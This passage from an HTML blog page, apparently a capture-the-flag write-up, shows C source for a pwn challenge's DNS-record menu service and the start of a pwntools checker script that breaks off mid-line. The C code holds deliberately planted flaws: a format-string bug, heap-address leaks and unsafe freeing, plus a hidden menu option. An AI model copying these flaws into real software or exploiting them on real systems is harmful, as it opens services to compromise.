Exit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"====================="</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"=====MENU======"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. set name"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. set motto"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3. show motto"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"4. Exit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==============="</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maybe_real_set_name</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%7s"</span>,visitor_name);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"OK, I know your name :"</span>);</span><br><span class="line"><span class="built_in">printf</span>(visitor_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">maybe_real_set_name();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_motto</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">0x200</span>] ;</span><br><span class="line">read_n(buffer,<span class="number">0x200</span>);</span><br><span class="line">motto = strdup(buffer);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (login_flag != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">char</span> * fmt = <span class="string">"%d"</span>;</span><br><span class="line"><span class="keyword">int</span> opt;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&gt;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">scanf</span>(fmt,&amp;opt)&lt;=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(opt)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span>((login_flag &amp; <span class="number">0x01</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">login_flag = login_flag|<span class="number">0x01</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"name:"</span>);</span><br><span class="line">set_name();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span>((login_flag &amp;<span class="number">0x10</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">login_flag = login_flag|<span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"motto:"</span>);</span><br><span class="line">set_motto();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">if</span>((login_flag &amp;<span class="number">0x100</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">login_flag = login_flag|<span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">if</span>(motto!=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">puts</span>(motto);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"invalid options\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_n</span><span class="params">(<span class="keyword">char</span> *src,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; i++ )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + src), <span class="number">1</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(src+i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(src+i) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_int</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> nptr[<span class="number">16</span>];</span><br><span class="line">read_n(nptr, <span class="number">0xA</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)atoi(nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_format</span><span class="params">(<span class="keyword">char</span> *ip)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(ip[i]==<span class="string">'.'</span>)&#123;</span><br><span class="line">num += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(num!=<span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_DNS</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> * <span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> len,i;</span><br><span class="line"><span class="keyword">char</span> *remark;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; DNS_Node_List[i]; ++i )</span><br><span class="line">;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">tmp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct DNS_Node));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ψ(｀∇´)ψ: Let me leave some clue [%03x]\n"</span>,((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp&amp;<span class="number">0xfff</span>));</span><br><span class="line"><span class="built_in">strcpy</span>(tmp-&gt;user,visitor_name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input domain: "</span>);</span><br><span class="line">read_n(tmp-&gt;domain,<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input length:"</span>);</span><br><span class="line">len =read_int();</span><br><span class="line">remark = <span class="built_in">malloc</span>(len+<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ψ(｀∇´)ψ: Let me leave some clue [%03x]\n"</span>,((<span class="keyword">unsigned</span>)remark&amp;<span class="number">0xfff</span>));</span><br><span class="line">tmp-&gt;ptr = remark;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input remark:"</span>);</span><br><span class="line">read_n(remark+<span class="number">0x20</span>,len);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input IP:"</span>);</span><br><span class="line">read_n(remark,<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">if</span>(check_format(remark)!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error input,bye!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">DNS_Node_List[i]=tmp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Complete\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parse_domain</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> domain[<span class="number">0x30</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> *<span class="title">tmp</span>=0;</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Give me ur domain:"</span>);</span><br><span class="line">read_n(domain,<span class="number">0x30</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( DNS_Node_List[i] &amp;&amp; !<span class="built_in">strcmp</span>(domain, DNS_Node_List[i]-&gt;domain) )</span><br><span class="line">&#123;</span><br><span class="line">tmp = DNS_Node_List[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"adder : %s\n"</span>,tmp-&gt;user );</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"IP    : %s\n"</span>,tmp-&gt;ptr );</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"remark: %s\n"</span>,(tmp-&gt;ptr + <span class="number">0x20</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"---------------------------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !tmp )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_DNS</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> domain[<span class="number">0x30</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> *<span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">int</span> i,zero,j;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Give me bad domain:"</span>);</span><br><span class="line">read_n(domain,<span class="number">0x30</span>);</span><br><span class="line">zero = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( DNS_Node_List[i] &amp;&amp; !<span class="built_in">strcmp</span>(domain, DNS_Node_List[i]-&gt;domain) &amp;&amp; !<span class="built_in">strcmp</span>(visitor_name,DNS_Node_List[i]-&gt;user) )</span><br><span class="line">&#123;</span><br><span class="line">zero = <span class="number">1</span>;</span><br><span class="line">tmp = DNS_Node_List[i];</span><br><span class="line">j=i;</span><br><span class="line"><span class="built_in">free</span>(tmp-&gt;ptr);</span><br><span class="line"><span class="built_in">free</span>(tmp);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(zero)&#123;</span><br><span class="line">  DNS_Node_List[j]=<span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"complete\n"</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"shr $0x16,%rsp\n"</span></span><br><span class="line">        <span class="string">"shl $0x16,%rsp\n"</span></span><br><span class="line">        <span class="string">"xor $0x188,%rsp\n"</span></span><br><span class="line">        <span class="string">"push %rbp\n"</span></span><br><span class="line">        <span class="string">"mov %rsp,%rbp\n"</span></span><br><span class="line">        <span class="string">"sub $0x20,%rsp\n"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">int</span> option;</span><br><span class="line">init();</span><br><span class="line"><span class="comment">//menu();</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&gt;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">scanf</span>(<span class="string">"%u"</span>,&amp;option)&lt;=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(option)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">menu1();</span><br><span class="line">login();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">add_DNS();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">parse_domain();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">delete_DNS();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"=͟͟͞͞ =͟͟͞͞ ﾍ( ´Д`)ﾉ :"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"              [Don't leave me alone, I can give u sh311 !]"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"              "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0xbabe</span>:</span><br><span class="line">game();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//login();</span></span><br><span class="line"><span class="comment">//game();</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">NODE -&gt; USER(8) + DOMAIN(0X30) +PTR(8)</span></span><br><span class="line"><span class="comment">CONTENT -&gt; DNS(0X20) + CONTENT(~)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">c</span><br></pre></td></tr></table></figure><h2 id="Checker"><a href="#Checker" class="headerlink" title="Checker"></a>Checker</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">coding_check_level = <span class="number">1</span></span><br><span class="line">fmt_check_level = <span class="number">0</span></span><br><span class="line">log_file = <span class="string">'note_check'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">check = <span class="keyword">False</span></span><br><span class="line">file_path = <span 